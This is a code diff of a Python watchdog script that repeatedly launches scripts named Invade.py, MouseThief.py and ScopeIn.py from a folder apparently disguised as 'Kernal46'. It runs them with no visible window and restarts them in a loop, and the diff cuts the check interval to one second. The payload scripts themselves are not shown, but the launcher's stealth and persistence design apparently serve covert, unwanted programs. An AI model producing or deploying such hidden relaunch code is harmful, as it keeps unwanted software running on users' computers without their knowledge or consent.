@@ -4,13 +4,12 @@ import random
 import subprocess
 import psutil
 
-path = "C:\Program Files\Python312\Python.exe " + "C:/Users/Public/Kernal46/"
-#invade = os.path.join(path, 'Invade.exe')
-#mouseThief = os.path.join(path, 'MouseThief.exe')
-#scopeIn = os.path.join(path, 'ScopeIn.exe')
-invade = os.path.join(path, 'C:/Users/Public/Kernal46/PythonBased/Invade.py')
-mouseThief = os.path.join(path, 'C:/Users/Public/Kernal46/PythonBased/MouseThief.py')
-scopeIn = os.path.join(path, 'C:/Users/Public/Kernal46/PythonBased/ScopeIn.py')
+path = "C:\Program Files\Python312\Python.exe "
+
+invade = path + 'C:/Users/Public/Kernal46/PythonBased/Invade.py'
+print('invade is now', invade)
+mouseThief = path + 'C:/Users/Public/Kernal46/PythonBased/MouseThief.py'
+scopeIn = path + 'C:/Users/Public/Kernal46/PythonBased/ScopeIn.py'
 print(invade)
 
 CREATE_NO_WINDOW = 0x08000000
@@ -25,7 +24,7 @@ print('count is', len(runners))
 if (len(runners) > 2):
     continueRunning = False
 
-sleep(50)
+sleep(1)
 while continueRunning:
     count = sum(1 for proc in psutil.process_iter() if proc.name() == 'Runner.exe')
     print('count is currently', count)
@@ -51,6 +50,6 @@ while continueRunning:
             subprocess.call(scopeIn, creationflags = CREATE_NO_WINDOW)
         else:
             print('already running scopeIn')
-    sleep(50)
+    sleep(1)
 
 print('done')
